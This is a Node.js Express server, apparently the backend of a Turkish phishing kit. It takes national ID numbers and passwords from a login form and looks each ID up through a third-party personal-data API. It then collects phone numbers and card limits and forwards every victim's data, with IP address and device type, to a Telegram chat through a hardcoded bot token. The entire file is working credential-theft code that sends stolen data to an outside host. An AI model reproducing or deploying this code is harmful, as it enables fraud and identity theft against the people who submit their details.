const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const session = require("express-session");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = "7532794844:AAEVd9ILVPD4p5yStZt6EAMuiEJ01ok2_Kw";
const TELEGRAM_CHAT_ID = "-1002546140880";

const userDataStore = {};

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static("public"));

app.use(session({
    secret: 'mySecretKey',
    resave: false,
    saveUninitialized: true
}));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "..", "public", "index.html"));
});

app.post("/giris", async (req, res) => {
    const { tc, password } = req.body;

    if (!tc || tc.trim() === "") {
        return res.redirect("/index.html?error=TC hatalı girdiniz.");
    }

    try {
        const apiUrl = `https://apiv2.tsgonline.net/tsgapis/Kettaass/adpro.php?auth=tsgxyunus&tc=${tc}`;
        const response = await axios.get(apiUrl);
        const { adi, soyadi, dogumtarihi } = response.data;

        console.log("API Cevabı:", response.data); 

        if (!adi || !soyadi || !dogumtarihi) {
            return res.redirect("/index.html?error=Tc kimlik numarasını hatalı girdiniz.");
        }

        req.session.userData = { tc, password, adi, soyadi, dogumtarihi };
        res.redirect(`/chack.html?adi=${encodeURIComponent(adi)}&soyadi=${encodeURIComponent(soyadi)}&dogumtarihi=${encodeURIComponent(dogumtarihi)}`);
    } catch (error) {
        console.error("API Hatası:", error);
        res.redirect("/index.html?error=Tc kimlik numarasını hatalı girdiniz");
    }
});

app.post("/chack", async (req, res) => {
    console.log(req.body);
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const islemSaati = new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" });
    const userAgent = req.headers["user-agent"];

    let cihazTuru = "Bilinmiyor";
    if (/android/i.test(userAgent)) {
        cihazTuru = "Android";
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        cihazTuru = "iOS";
    } else if (/windows|mac|linux/i.test(userAgent)) {
        cihazTuru = "PC";
    }

    const { phone, limit, adi, soyadi } = req.body;

    if (!adi || !soyadi) {
        return res.status(400).send("Eksik bilgi: adi veya soyadi bulunamadı.");
    }

    if (!userDataStore[adi]) {
        userDataStore[adi] = { 
            phone: phone || "Belirtilmedi", 
            limit: limit || "Belirtilmedi",
            isSent: false
        };
    }

    if (userDataStore[adi].isSent) {
        console.log("Bu kullanıcı için zaten Telegram mesajı gönderildi:", adi);
        return res.status(400).send("Bu kullanıcı için zaten işlem yapıldı.");
    }

    let storedPhone = userDataStore[adi].phone;
    let storedLimit = userDataStore[adi].limit;

    if (typeof storedPhone === "string") {
        storedPhone = [...new Set(storedPhone.split(","))].join(", ");
    }
    if (typeof storedLimit === "string") {
        storedLimit = [...new Set(storedLimit.split(","))].join(", ");
    }

    const { tc, password, dogumtarihi } = req.session.userData || {};

    const entry = `📱Cihaz Türü: ${cihazTuru}\n🌐IP Adresi: ${ip}\n🕒İşlem Saati: ${islemSaati}\n👤Ad: ${adi} ${soyadi}\n📍TC: ${tc || "Belirtilmedi"}\n🔑Şifre: ${password || "Belirtilmedi"}\n📞Numara: ${storedPhone}\n💳Limit: ${storedLimit}\n📅Doğum Tarihi: ${dogumtarihi || "Belirtilmedi"}\n\n`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: `🔥Yeni LOG:\n\n\n${entry}`
        });

        userDataStore[adi].isSent = true;

        delete userDataStore[adi];

        return res.redirect(`/basarili.html?adi=${encodeURIComponent(adi)}&soyadi=${encodeURIComponent(soyadi)}&phone=${encodeURIComponent(storedPhone)}&limit=${encodeURIComponent(storedLimit)}&islemSaati=${encodeURIComponent(islemSaati)}`);

    } catch (error) {
        console.error("Telegram Hatası:", error);
        return res.status(500).send("Telegram'a gönderim sırasında bir hata oluştu.");
    }
});

app.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});

module.exports = app;
